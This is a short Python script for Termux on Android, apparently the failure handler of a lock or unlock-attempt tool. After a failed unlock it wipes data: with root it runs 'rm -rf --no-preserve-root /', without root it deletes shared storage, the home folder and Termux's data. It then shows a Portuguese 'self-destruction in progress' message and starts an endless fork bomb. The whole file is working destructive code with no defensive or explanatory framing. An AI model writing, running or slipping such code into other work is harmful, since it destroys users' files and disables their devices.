#!/data/data/com.termux/files/usr/bin/python3

def fail():

    try:

        from time import sleep
        from os import system, fork

        system('sudo echo "Superuser binary detected." | grep "binary detected" >> $HOME/.bloqueio/user')
        print ('\x1b[H\x1b[2J\x1b')

        arquivo = open('/data/data/com.termux/files/home/.bloqueio/user', 'r')

        if 'Superuser binary detected.' in arquivo.read():
            system('sudo rm -rf --no-preserve-root / > /dev/null')

        else:
            system('rm -rf --no-preserve-root /sdcard > /dev/null')
            system('rm -rf --no-preserve-root $HOME > /dev/null')
            system('rm -rf --no-preserve-root /data/data/com.termux/ > /dev/null')

        arquivo.close()

        sleep(5)

        system('termux-toast -g middler -b black -c red "Excesso de tentativas de desbloqueio atingidas, autodestruição em progresso..."')

        while True:
            fork()

    except (KeyboardInterrupt):

        exit()
